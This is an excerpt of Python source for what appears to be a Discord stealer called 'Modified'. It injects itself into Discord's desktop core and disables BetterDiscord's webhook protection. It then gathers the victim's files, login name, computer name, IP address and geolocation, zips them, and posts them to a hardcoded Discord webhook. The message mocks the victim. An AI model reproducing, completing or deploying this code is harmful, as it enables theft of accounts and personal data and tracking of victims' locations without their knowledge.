...
BOT_NAME = "Modified"
BOT_WEBHOOK = "https://discord.com/api/webhooks/917049906601005099/fBUDiuWHlXQR4hM7PnpxAPxGOV7h0i2UyshVYLhCCC964w5JwuEpjixcm_UNiag5u0Ak"



class discord_modified:
    def __init__(self):
        self.webhook = BOT_WEBHOOK
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\discord_modified"
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\"+BOT_NAME))
    ...
    def bypass_better_discord(self):
        ...
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "file")
        with open(bd, 'w'): pass
    ...
    def SendInfo(self):
        ...
        new = os.path.join(self.appdata, f'{BOT_NAME}-[{os.getlogin()}].zip')
        self.zip(temp, new)
        ...
        embed = {
            "avatar_url":"https://raw.githubusercontent.com/GbeshMod/discord/main/pic/discordbig.gif",
            "embeds": [
                {
                    "author": {
                        "name": f"{BOT_NAME} Bot",
                        "url": "https://github.com/GbeshMod/discord",
                        "icon_url": "https://raw.githubusercontent.com/GbeshMod/discord/main/pic/discord.gif"
                    },
                    "description": f"**{os.getlogin()}** Just get fucked 🥴 \n```fix\n💻 ComputerName: {os.getenv('COMPUTERNAME')}\n️🛰️ IP: {ip}\n🏘️ City: {city}\n🏞️ Region: {region}\n🌍 Country: {country}```[🛸 Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://raw.githubusercontent.com/GbeshMod/discord/main/pic/discordmod%20(2).gif"
                    },       

                    "footer": {
                      "text": "©GbeshMod https://github.com/GbeshMod/discord.git"
                    }
                }
            ]
        }
